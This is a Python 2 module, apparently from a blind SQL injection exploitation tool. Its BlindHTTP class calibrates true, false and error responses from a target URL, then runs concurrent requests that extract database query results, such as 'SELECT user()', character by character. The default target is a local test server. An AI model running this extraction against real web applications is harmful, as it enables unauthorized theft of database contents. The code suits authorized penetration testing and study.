from .query import Query
from .requester import *
from .technique import *
from .truth import *
from .pretty_print import PrettyTable
from .. import settings

from urllib import quote

class BlindHTTP:
	def __init__(self,\
			url   				= Query('http://127.0.0.1:8090/boolean?${query}'),\
			method 				= 'GET',\
			query 				= Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote),\
			comparison_attr 	= "size",*args,**kwargs):

		#setup the queries
		self.url = url
		self.query = query

		#acceptable deviation is determined by the comparison attr
		acceptable_deviation = settings.COMPARISON_ATTRS[comparison_attr]['std']

		#build a Requester object. You can pass this any args that you would pass to requests.Request
		self.requester = HTTPRequester(url = self.url, method = method, *args, **kwargs)

		#build a Truth class
		self.truth = settings.COMPARISON_ATTRS[comparison_attr]['truth'](comparison_attr = comparison_attr,acceptable_deviation = acceptable_deviation)

		#the queries default options should evaluate to True in whatever application we are testing. If we flip the comparator it should evauluate to false. 
		#here, we figure out what the opposite comparator is.
		opp_cmp = settings.OPPOSITE_COMPARATORS[query.get_option('comparator')]

		#setup some base values
		for i in xrange(settings.TRUTH_BASE_REQUESTS):
		    self.truth.add_true((self.requester.make_request(query.render())))
		self.query.set_option('comparator',opp_cmp)
		for i in xrange(settings.TRUTH_BASE_REQUESTS):
		    self.truth.add_false((self.requester.make_request(query.render())))
		self.query.set_option('char_index','1000')
		for i in xrange(settings.TRUTH_BASE_REQUESTS):
		    self.truth.add_error((self.requester.make_request(query.render())))


	def run(self,query='SELECT user()',sleep=0,concurrency=50):		
		#build our technique
		tech = BlindTechnique(make_request_func=self.requester.make_request,query=self.query, truth=self.truth)
		
		if settings.PRETTY_PRINT and not settings.QUIET:
			#setup a PrettyTable for curses like printing
			pretty_table = PrettyTable(get_table_callback=tech.get_results,get_status_callback=tech.get_status,update=settings.PRETTY_PRINT_FREQUENCY)
			#pretty_table = PrettyTable(get_table_callback=tech.get_results,update=settings.PRETTY_PRINT_FREQUENCY)
		
		#run our technique
		techgl = tech.run( user_query = query ,sleep = sleep,concurrency = concurrency,row_len=5)

		if settings.PRETTY_PRINT and not settings.QUIET:
			#start printing the tables
			pretty_table.start()

		#wait for the technique to finish
		techgl.join()

		if settings.PRETTY_PRINT and not settings.QUIET:
			#kill the pretty tables
			pretty_table.die()
		
		results = tech.get_results()

		if not settings.QUIET and not settings.PRETTY_PRINT:
			print results

		return results 